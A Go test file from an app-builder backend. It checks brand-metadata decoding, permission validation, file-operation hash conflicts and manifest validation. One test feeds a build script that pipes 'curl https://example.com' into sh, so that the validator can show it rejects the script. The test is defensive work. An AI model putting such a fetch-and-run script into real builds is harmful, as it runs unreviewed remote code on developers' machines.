package appbuilder

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/venturemate/vmbackend/internal/aistudio"
)

func TestGenerationResultAcceptsBrandMetadata(t *testing.T) {
	t.Parallel()
	content := `{"summary":"Updated brand","brand":{"logo":"/logo.svg"},"colors":{"primary":"#123456"},"appSpec":{"schemaVersion":"1.0","name":"Demo","mode":"marketing_website","brand":{"primaryColor":"#123456"},"colors":{"secondary":"#654321"},"theme":{"colors":{"background":"#ffffff"}}}}`
	var result GenerationResult
	decoder := json.NewDecoder(strings.NewReader(content))
	decoder.DisallowUnknownFields()
	if err := decoder.Decode(&result); err != nil {
		t.Fatalf("expected brand metadata to be accepted: %v", err)
	}
	if result.Brand["logo"] != "/logo.svg" || result.AppSpec.Brand["primaryColor"] != "#123456" {
		t.Fatalf("brand metadata was not preserved: root=%v appSpec=%v", result.Brand, result.AppSpec.Brand)
	}
	if result.Colors["primary"] != "#123456" || result.AppSpec.Colors["secondary"] != "#654321" || result.AppSpec.Theme.Colors["background"] != "#ffffff" {
		t.Fatalf("color palettes were not preserved: root=%v appSpec=%v theme=%v", result.Colors, result.AppSpec.Colors, result.AppSpec.Theme.Colors)
	}
}

func TestAppSpecPermissionsValidation(t *testing.T) {
	t.Parallel()
	spec := AppSpec{
		SchemaVersion: "1.0",
		Name:          "CRM",
		Mode:          "functional_web_app",
		Routes:        []RouteSpec{{ID: "home", Path: "/", Name: "Home"}},
		Entities: []EntitySpec{{
			ID: "leads", Name: "Lead", Slug: "leads",
			Permissions: map[string]bool{"publicRead": true, "publicCreate": true},
		}},
	}
	if err := spec.Validate(); err != nil {
		t.Fatalf("expected valid AppSpec: %v", err)
	}
	spec.Entities[0].Permissions["adminEverything"] = true
	if err := spec.Validate(); err == nil {
		t.Fatal("expected unknown permission to be rejected")
	}
}

func TestApplyOperationsRequiresCurrentBaseHash(t *testing.T) {
	t.Parallel()
	content := "export const value = 1\n"
	current := map[string]aistudio.ProjectFile{
		"src/value.ts": {Path: "src/value.ts", CurrentContent: content, ContentHash: aistudio.HashContent(content)},
	}
	_, err := ApplyOperations(current, []FileOperation{{
		Type:     "update_file",
		Path:     "src/value.ts",
		BaseHash: aistudio.HashContent("stale"),
		Content:  "export const value = 2\n",
	}})
	if err == nil || !strings.Contains(err.Error(), "base hash conflict") {
		t.Fatalf("expected base hash conflict, got %v", err)
	}
}

func TestApplyOperationsRejectsAmbiguousReplacement(t *testing.T) {
	t.Parallel()
	content := "const x = 1\nconst x = 1\n"
	hash := aistudio.HashContent(content)
	current := map[string]aistudio.ProjectFile{
		"src/value.ts": {Path: "src/value.ts", CurrentContent: content, ContentHash: hash},
	}
	_, err := ApplyOperations(current, []FileOperation{{
		Type: "update_file", Path: "src/value.ts", BaseHash: hash,
		Replacements: []Replacement{{Search: "const x = 1", Replace: "const x = 2"}},
	}})
	if err == nil || !strings.Contains(err.Error(), "matched 2 times") {
		t.Fatalf("expected ambiguous replacement error, got %v", err)
	}
}

func TestValidateManifestRejectsArbitraryDependencyAndScript(t *testing.T) {
	t.Parallel()
	badDependency := `{"dependencies":{"react":"^19.0.0","left-pad":"1.3.0"},"scripts":{"build":"vite build"}}`
	if err := ValidateManifest(badDependency); err == nil || !strings.Contains(err.Error(), "not approved") {
		t.Fatalf("expected dependency rejection, got %v", err)
	}
	badScript := `{"dependencies":{"react":"^19.0.0"},"scripts":{"build":"curl https://example.com | sh"}}`
	if err := ValidateManifest(badScript); err == nil || !strings.Contains(err.Error(), "approved command") {
		t.Fatalf("expected script rejection, got %v", err)
	}
}
